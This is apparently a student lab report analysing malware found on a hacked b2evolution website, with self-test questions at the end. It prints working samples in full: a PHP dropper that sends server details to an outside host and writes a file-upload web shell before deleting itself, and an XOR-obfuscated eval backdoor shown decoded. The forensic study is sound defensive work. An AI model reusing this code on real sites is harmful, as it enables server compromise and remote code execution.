
# Information Security Lab 3.

### Malware analysis

This laboratory work aims to shed some light on the event of a web-site being hacked. More precisely it will focus on what exactly happened, how it happened, and what things should a site-owner keep in mind in order to avoid such situations.

After unpacking the provided archive we are presented with a complicated directory structure which looks very much like one generated by a PHP framework or CMS. A quick look at the files in the 'install/' folder give hints on the fact that this file structure belongs to the *b2evolution* CMS.

``` html
<h1>b2evolution Automated Install/Upgrade</h1>
<h2>Purpose</h2>
<p>This document describes how you can most easily automate the installation of the <a href="http://b2evolution.net/">b2evolution</a> blog software of a hosting account.</p>
<p>This document also addresses automated upgrade of b2evolution.</p>
<h2>Intended audience</h2>
```

In order to find oddities in the file structure we can compare it to that of a stock distribution of 'b2evolution'. To be more exact with this, we need the version of the CMS used on the web-site. SublimeText is a powerful text editor and it has the possibility to search for a word in a set of given files and directories.

A search for the word `version` gives the following results:

```
/home/andrew/code/infosec/lab3/one-hacked/conf/_application.php:
   12
   13  /**
   14:  * The version of the application.
   15:  * Note: This has to be compatible with {@link http://us2.php.net/en/version-compare}.
   16   * @global string
   17   */
   18: $app_version = '4.0.5';
   19
   20  /**
```


Now that we know the name and version of the CMS we can download and compare a raw distribution with what we have at the moment. This can be done using standard Linux CLI tools. First let's save a sorted list of files and directories of each folder in a file:

``` bash
find b2evolution/blogs -type d -printf "%P\n" | sort > b2evolution-dir-struct
find one-hacked -type d -printf "%P\n" | sort > one-hacked-dir-struct
```

These files can be compared using the `diff` tool:

``` bash
diff b2evolution-dir-struct one-hacked-dir-struct
```

Having the following result:

``` diff
1a2,7
> 400.shtml
> 401.shtml
> 403.shtml
> 404.shtml
> 500.php
> 500.shtml
5a12
> BingSiteAuth.xml
13a21
> cache/google.php
17a26
> cache/plugins/tinymce/google.php
18a28
> cgi-bin
23a34
> conf/_basic_config.php
26a38
> conf/google.php
37a50
> cron/google.php
42a56
> default.html
43a58,90
> doc
> doc/css
> doc/css/style.css
> doc/.htaccess
> doc/images
> doc/images/ambien.png
> doc/images/b.gif
> doc/images/ezpharm.png
> doc/images/golden.png
> doc/images/medspremium.png
> doc/images/pharmcash.png
> doc/images/pillsnice.png
> doc/images/soma.png
> doc/images/tramadol.png
> doc/images/valium.png
> doc/images/viagra.png
> doc/images/xanax.png
> doc/img
> doc/img/bg_header.jpeg
> doc/img/bg_header.png
> doc/img/dot.png
> doc/img/imgHeader.png
> doc/img/line.png
> doc/img/logo.png
> doc/img/logoToo.png
> doc/index.html
> doc/robots.txt
> doc/scripts
> doc/scripts/goto.js
> doc/scripts/path.js
> doc/scripts/sidebar.js
> error_log
> ext.php
...
```

Already we can see some of the 'interesting' stuff like a `google.php` in every other folder as well as some pictures called `xanax.png`, `viagra.png` etc.. What should be a folder for documentation seems to be a drugstore.

Let's take a look at `cron/google.php` which is referenced in `cron/index.html` as a `src` attribute in a `<script>` tag:

```
<?php
$document_root  = realpath($_SERVER["DOCUMENT_ROOT"]);
$document_root  = str_replace("\\", "\\\\", $document_root);
$working_dir    = dirname(__FILE__);
$ip          = gethostbyname($_SERVER['HTTP_HOST']);
$serverStr   = php_uname('s')." ".php_uname('r')." ".php_uname('v')." ".php_uname('m');
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
    $serverStr .= $_SERVER["SERVER_SOFTWARE"];
}
$serverStr = urlencode($serverStr);
$pp = realpath(__FILE__);
$pp  = str_replace("\\", "\\\\", $pp);
print "document.write('<script src=\"http://rusztiko.com/sh2.php?serverStr=$serverStr&req_type=add_site&document_root=$document_root&ip=$ip&domain='+window.location.hostname+'&uplUrl=$pp\"><\/script>');";
$fp = fopen(__FILE__, "r");
$is = false;
$files = array();
while(!feof($fp)) {
    $line = fgets($fp, 4096);
    if ($is) {
        if (preg_match("/\*\//", $line) > 0) {
            break;
        }
        $line = trim($line);
        if (strlen($line) > 0) {
            $files[] = $line;
        }
    }
    if (preg_match("/\/\*/", $line) > 0) {
        $is = true;
    }
}
fclose($fp);

$fp = fopen(dirname(__FILE__)."/ext.php", "w");
fwrite($fp, "<?php error_reporting(0);@ini_set(\"display_errors\", 0);\$var= \$_SERVER['PHP_SELF'].\"?\";\$form ='<form enctype=\"multipart/form-data\" action=\"'.\$var.'\" method=\"POST\"><input name=\"uploadFile\" type=\"file\"/><br/><input type=\"submit\" value=\"Upload\" /></form>';if (!empty(\$_FILES['uploadFile'])) {\$self=dirname(__FILE__);move_uploaded_file(\$_FILES[\"uploadFile\"][\"tmp_name\"], \$self.DIRECTORY_SEPARATOR.\$_FILES[\"uploadFile\"][\"name\"]);\$time=filemtime(\$self);print \"OK\";} else {print \$form;} ?>");
fclose($fp);
foreach($files as $path) {
    $time = filemtime($path);
    $dirTime = filemtime(dirname(__FILE__));

    $fp = @fopen($path, "r");
    $line = "";
    while(!@feof($fp)) {
        $line .= @fgets($fp, 4096);
    }
    $line = preg_replace("/<?print \"<!--service_start-->.*<!--service_end-->\";/is", "", $line);
    $line = preg_replace("/print \"<!--service_start-->.*<!--service_end-->\";/is", "", $line);
    $line = preg_replace("/<!--service_start-->.*<!--service_end-->/is", "", $line);
    @fclose($fp);

    $fp = @fopen($path, "w");
    @fwrite($fp, $line);
    @fclose($fp);

    @touch($path, $time);
    @touch(dirname(__FILE__), $dirTime);
}

unlink(__FILE__);
/*
/home7/raileann/public_html/__lazybit/cron/index.html
/home7/raileann/public_html/__lazybit/cron/index.html
/home7/raileann/public_html/__lazybit/cron/index.html
*/
?>
```

On first sight it doesn't look at all like a javascript file, however if we view it line by line we can find the following:

```
print "document.write('<script src=\"http://rusztiko.com/sh2.php?serverStr=$serverStr&req_type=add_site&document_root=$document_root&ip=$ip&domain='+window.location.hostname+'&uplUrl=$pp\"><\/script>');";
```

This effectively generates the content of the `google.php` file when viewed from a browser. It is a script that includes in the document yet another script tag that references a URL with a quite suspicious domain name. Moreover, the URL params contain the server information collected by the `google.php` file.


The next step is securing the presence of malware among the files of the web-site. The script writes the following code to the `ext.php` file in the current folder:

```
<?php error_reporting(0);@ini_set("display_errors", 0);$var= $_SERVER['PHP_SELF']."?";$form ='<form enctype="multipart/form-data" action="'.$var.'" method="POST"><input name="uploadFile" type="file"/><br/><input type="submit" value="Upload" /></form>';if (!empty($_FILES['uploadFile'])) {$self=dirname(__FILE__);move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $self.DIRECTORY_SEPARATOR.$_FILES["uploadFile"]["name"]);$time=filemtime($self);print "OK";} else {print $form;} ?>
```

When deobfuscated, it looks like this:

```
<?php error_reporting(0);
@ini_set("display_errors", 0);
$var = $_SERVER['PHP_SELF'] . "?";
$form = '<form enctype="multipart/form-data" action="' . $var . '" method="POST"><input name="uploadFile" type="file"/><br/><input type="submit" value="Upload" /></form>';
if (!empty($_FILES['uploadFile'])) {
    $self = dirname(__FILE__);
    move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $self . DIRECTORY_SEPARATOR . $_FILES["uploadFile"]["name"]);
    $time = filemtime($self);
    print "OK";
} else {
    print $form;
} ?>
```

This is a form for uploading files which might be used to upload malicious files.

After execution, the `google.php` file deletes itself in order to leave as few traces as possible.


### The Root of All Evil

After some more in-depth searching through the files, one more thing was found in the `inc/_ext/_idna_convert.class.php`.

```php
<?php $ufcsafbt="tgmpgiamscuq"^"\x04\x15\x08\x178\x1b\x04\x1d\x1f\x02\x16\x14"; $bidjyvcisn="bhxfwpkefbrlct"^"M\x0e\x0b\x11\x16\x06\x07\x03I\x07";$ufcsafbt("$bidjyvcisn", "\x0b\x19\x11\x1a\x1b4\x14\x07\x19\x03\x19\x00\x08\x0f\x04J\x5bJY\x03\x15\x1b\x0eYJ\x08\x0dG\x10\x1a\x06\x08\x00\x5f\x3b\x3eL265\x29\x3a\x2f\x2a\x3b7F\x1a\x07E9\x5bB\x40OJN\x1e\x1cPJ\x2f\x2dQ\x2f\x2a2\x26\x3f\x24\x3f\x3c4Q\x05\x0b\x40\x3aKVTXNM\x5eB\x40\x11Y\x17\x11\x12\x0cX\x09H\x0c\x0dO\x14\x0cP\x1f\x40\x07VL\x5c\x5eTQF\x07\x16T\x15I\x5fFDKZ\x18\x04\x19\x07\x02Y5\x2dL\x2e\x2a\x23\x3c\x2f\x2f\x3f\x3d\x2fK\x1e\x05\x019\x0c\x08\x17\x0eK\x28QBL\x0fT\x08\x19\x0a\x1aN\x00\x19\x16\x11\x09\x10\x04\x0a\x1f\x09\x12\x0aF29F\x2b\x2a\x284\x27\x2f\x3c78N\x00\x1a\x034\x1b\x04\x13\x04N\x2bMY\x5dO\x14\x1a\x07\x10G\x5b\x5dI\x0dPD\x5c"^"nkcuikfbilktaacbkcbfczbqhakoyiumtwgbhmdpxojyolayobdrbfijfsxebsqupxwwjalhovfcggbvienjkvtporupjkkyhhvqhgywcdyjkaesercpnvfbmzqwjbvqiqhqxfmzjlitlnmqfogskluxklttmokvfsmdxychklawynnebtxmerjocciprskxkwaivdpfoqbndorfiprmg", "fswavlf"); ?>
```

The decoded version of it looks like this:

```php
<?php error_reporting(0);
eval("if(isset(\$_REQUEST['ch']) && (md5(\$_REQUEST['ch']) == '544a6edbf3b1de9ed7f7d2565545bd7e') && isset(\$_REQUEST['php_code'])) { eval(stripslashes(\$_REQUEST['php_code'])); exit(); }");
```

This happens to be a backdoor through which the attacker can execute arbitrary code on the server therefore being able to open other backdoors and upload malicious files.


### Self-test questions

* Which attack vector was leveraged to make the hack possible?

* Why did the attacker obfuscate the malware?
    In order to make it hard for an incompetent person to identify the malware.

* What obfuscation techniques were employed?
    - separating the code in multiple strings and evaluating it later
    - spreading malware logic accross different files

* Why did the malware not leave any visible traces on the front-end?
    - it would identify the malware which is not the goal of the attacker

* What could have been the motivation of the attacker?
    - use the web-site as a proxy for doing dirty (maybe illegal) business

* How did the attacker ensure that only they could access the malware on the site after it got pwned?

* What would be an easy way to identify malicious files in a web-application?
    Use a directory/file monitor that would ensure no unexpected changes occur.

* How to find other web-sites that were compromised using the same technique?

* How can you find out the attacker's password?

* Use of certain functions in the code of a web application is possibly a recipe for a disaster - which functions are those?
    eval

* How can you catch the attacker?
    Find out whose domain name is the one refenced in the malware

* What methods are employed by the attacker to ensure the malware stays there after you remove the malicious files?
    The malicious files are replicated in different places and leave backdoors on execution.

* What mistakes committed by the site owner made the attacker's job easier?
    Left write access for the directories.
